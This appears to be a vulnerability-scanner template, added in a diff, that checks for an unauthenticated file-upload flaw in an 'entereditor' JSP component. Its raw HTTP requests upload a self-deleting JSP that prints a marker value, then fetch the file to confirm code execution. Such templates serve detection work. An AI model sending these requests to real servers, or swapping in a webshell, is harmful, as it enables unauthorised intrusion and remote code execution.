@@ -1,0 +1,38 @@
+id: zdet-entereditor-fileupload
+
+info:
+  name: zdet-entereditor-fileupload
+  author: zdet-entereditor-fileupload
+  severity: high
+
+
+
+variables:
+  filename: "{{to_lower(rand_text_alpha(8))}}"
+  boundary: "{{to_lower(rand_base(32))}}"
+
+http:
+  - raw:
+      - |
+        POST /entsoft_en/entereditor/jsp/fileupload.jsp?filename={{filename}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        
+        <% out.println(111*111);new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+
+      - |
+        GET /enterdoc/uploadfile/{{filename}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
+
+    matchers:
+      - type: dsl
+        dsl:
+          - contains(body_2,"12321")
